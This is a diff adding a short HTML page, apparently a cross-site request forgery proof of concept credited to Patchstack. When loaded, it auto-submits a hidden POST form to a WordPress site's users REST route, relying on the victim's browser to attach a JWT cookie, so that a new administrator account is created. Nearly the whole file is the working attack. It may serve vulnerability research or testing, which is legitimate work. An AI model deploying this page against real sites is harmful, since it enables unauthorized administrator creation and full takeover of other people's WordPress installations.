@@ -1,0 +1,17 @@
+<!doctype html>
+<html><head><title>Other site: auto-submitting form</title><script src="common.js"></script></head>
+<body>
+<!-- The Patchstack PoC: form POST to /wp/v2/users, the browser adds the JWT cookie on its own -->
+<form id="call" method="POST"></form>
+<script>
+  const form = document.getElementById('call');
+  form.action = target + '/?rest_route=/wp/v2/users';
+  for (const [name, value] of Object.entries(newAdmin)) {
+    const input = document.createElement('input');
+    input.name = name;
+    input.value = value;
+    form.appendChild(input);
+  }
+  form.submit();
+</script>
+</body></html>
